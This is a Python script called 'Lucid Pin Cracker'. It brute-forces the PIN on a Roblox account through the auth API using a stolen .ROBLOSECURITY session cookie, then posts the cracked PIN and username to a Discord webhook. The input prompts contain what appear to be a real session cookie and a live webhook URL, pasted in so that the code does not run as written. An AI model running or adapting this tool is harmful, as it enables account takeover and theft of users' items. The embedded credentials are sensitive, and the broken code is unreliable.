import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input(_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_C3EEC3CBF25E73DCA2A78BC2AA79B9E134302ABD5AC040FD8B585A8AACED5442D52D6B92427FE398390F7153E3DBF4D51F5122661AD7CCE40432D7AE70206B24D74DAC89E2864E3E2D563DD6A64BD04ECF8CB00285D104F98AF864317A3946A06523A103460E5A9EC01ECEF392752C1717C0140A95B50E2A740690C6BC5552CC046504E3F6AF3BA6B8DCBDED5BAA143AE21080C213D36B23DCE769CC96E6F3E512C7BF56371D2F52876F6F05E60B22746C3D2344445D1D421912CDDE522E7FE2C9C150BED6D2B43DA4DD1920F31A87897A45DCB7EA2FAB6A51B47B0BF8A02C91178A0E921B70784AFC017D8407E431A0226557F28DDAB9348ED9D117A1FC3A73860DE401A919DB1AB0AA57A7F14E9AA0C0663BBDE60C2342A64B2673686305B617F049E4C63B4D9D864CB99EF56AE922EB9BB6CF2495E85978743CC0CAC9E7AF06C4D913FF0CA63E4DC4391F40275775A12B2AE029954696C7404E17B6027798166762DE406E239CABEE0BAF8620A3F623FE8BCBF2596A9694BB17B945D8FD32E39B81B527024D7A0532FD0A596B8BE024D9C0AFEA214A1558ED91BF3DE3C62F855F6B691FBCF75394315D869FBCEBDED598C5D9EFEC29608B0C9B6A45A8757CB92114FAA81FC11FFCD457A14903E80B95736A62036E27C1920DD4AB60449637DA273546AE006A4DB5F526AFE81EF6B5438AD4531FCD8FC8B2BFAF08A9EF68D5B67A613EE948BF0D34CE4378F6B84F1631A1C3761D92D97D4B20136949B2FBAEBD020E60A2B854DADF392620E5C8B5930E8C39E8116E379366F0F4FAA6BA978ED21612D70358391F3F20FD68624A6AE87BFE5A3BE9F839ED9A715323D5361F92C4F04D2EFA3796783ED2FE65E3594B09DF0DD041A7C57CF6F405273B6DBBA151F8033AC08FCCA1C23FDE85A4FCF74EB8882E72B6992D5ECA84B524A809658774FAD1A8F8
)
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input(https://discord.com/api/webhooks/1285403581561835582/0H0b1saSNHCQRxHKjKqIGweM7wDvaNEhju8PmdGv7CneoQx-3nE0uELAwMql_mbgX7qP)
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝

   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Lucid Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
        


        



    
        
            
        



